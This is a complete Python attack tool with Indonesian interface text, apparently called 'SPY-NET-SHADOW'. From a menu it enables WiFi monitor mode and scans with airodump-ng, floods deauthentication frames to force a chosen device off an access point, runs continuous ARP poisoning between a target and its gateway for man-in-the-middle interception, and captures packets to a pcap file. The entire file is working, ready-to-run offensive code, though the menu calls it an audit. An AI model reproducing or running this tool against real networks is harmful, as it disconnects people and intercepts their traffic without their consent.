```python
#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import threading
from scapy.all import *

# --- BRANDING & STYLING ---
C = '\033[96m'  # Cyan
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
R = '\033[91m'  # Red
W = '\033[0m'   # White
B = '\033[1m'   # Bold

BANNER = f"""
{R}{B}
  ██████  ██▓███  ▓██   ██▓    ███▄    █ ▓█████ ▄▄▄█████▓
 ▒██    ▒ ▓██░  ██▒▒██  ██▒    ██ ▀█   █ ▓█   ▀ ▓  ██▒ ▓▒
 ░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░    ██  ▀█  █ ▒███   ▒ ▓██░ ▒░
   ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░    ██▒  ▐▌█▒ ▒▓█  ▄ ░ ▓██▓ ░ 
 ▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░    ██░   ▓██░░▒████▒  ▒██▒ ░ 
 ▒ ▒▓▒ ▒ ░▒▓▒ ░ ░░  ██▒▒▒      ░ ▒░   ▒ ▒ ░░ ▒░ ░  ▒ ░░   
 ░ ░▒  ░ ░░▒ ░      ▓██ ░▒░      ░ ░░   ░ ▒░ ░ ░  ░    ░    
 ░  ░  ░  ░░        ▒ ▓ ░░          ░   ░ ░    ░     ░      
       ░            ░ ░                  ░    ░  ░        
{W}{C}        >>> SPY-NET-SHADOW | NAGA-SHADOW V1.0 <<<
{W}{G}        [ Powered by SPY-E & 123Tool Security ]
"""

def check_root():
    if os.geteuid() != 0:
        print(f"{R}[!] ERROR: Jalankan script ini sebagai ROOT!{W}")
        sys.exit(1)

def get_interface():
    interfaces = os.listdir("/sys/class/net/")
    wlans = [i for i in interfaces if "wlan" in i]
    if not wlans:
        print(f"{R}[!] WiFi Adapter tidak ditemukan!{W}")
        sys.exit(1)
    return wlans[0]

def enable_monitor(iface):
    print(f"{Y}[*] Mengaktifkan Monitor Mode di {iface}...{W}")
    os.system(f"ip link set {iface} down")
    os.system(f"iw dev {iface} set type monitor")
    os.system(f"ip link set {iface} up")
    print(f"{G}[OK] Mode Monitor Aktif!{W}")

def scan_wifi(iface):
    print(f"{C}[*] Menjalankan Reconnaissance WiFi (airodump-ng)...{W}")
    os.system(f"airodump-ng {iface}")

# --- ATTACK FUNCTIONS ---

def deauth(iface, target, bssid):
    print(f"{R}[!] Menyerang Target: {target} via AP: {bssid}...{W}")
    # Dot11 frame for deauthentication
    pkt = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    try:
        while True:
            sendp(pkt, iface=iface, count=10, inter=0.1, verbose=False)
            print(f"{R}>>> Sending Deauth Packets to {target}...{W}", end="\r")
    except KeyboardInterrupt:
        print(f"\n{G}[+] Serangan dihentikan.{W}")

def mitm_spoof(iface, target_ip, gw_ip):
    print(f"{R}[!] Memulai ARP Poisoning antara {target_ip} <=> {gw_ip}...{W}")
    pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=gw_ip)
    pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=gw_ip, psrc=target_ip)
    try:
        while True:
            sendp(pkt1, iface=iface, verbose=False)
            sendp(pkt2, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{G}[+] MITM dihentikan.{W}")

# --- MAIN MENU ---

def main():
    os.system("clear")
    print(BANNER)
    check_root()
    iface = get_interface()
    
    print(f"{B}Detected Interface: {G}{iface}{W}\n")
    print(f"{B}PILIH MODUL AUDIT:{W}")
    print(f"1) {G}WiFi Scanner{W} (Reconnaissance)")
    print(f"2) {G}Deauth Attack{W} (Disruption Test)")
    print(f"3) {G}MITM Spoofing{W} (Traffic Interception)")
    print(f"4) {G}Packet Sniffing{W} (Capture PCAP)")
    print(f"5) {R}Exit{W}")
    
    choice = input(f"\n{C}SPY-SHADOW > {W}")
    
    if choice == '1':
        enable_monitor(iface)
        scan_wifi(iface)
    elif choice == '2':
        target = input(f"{Y}Target MAC: {W}")
        bssid = input(f"{Y}BSSID (AP MAC): {W}")
        enable_monitor(iface)
        deauth(iface, target, bssid)
    elif choice == '3':
        t_ip = input(f"{Y}Target IP: {W}")
        g_ip = input(f"{Y}Gateway IP: {W}")
        mitm_spoof(iface, t_ip, g_ip)
    elif choice == '4':
        fname = input(f"{Y}Output Name (.pcap): {W}")
        print(f"{C}[*] Sniffing 500 packets...{W}")
        pkts = sniff(iface=iface, count=500)
        wrpcap(fname, pkts)
        print(f"{G}[OK] Saved to {fname}{W}")
    else:
        sys.exit()

if __name__ == "__main__":
    main()
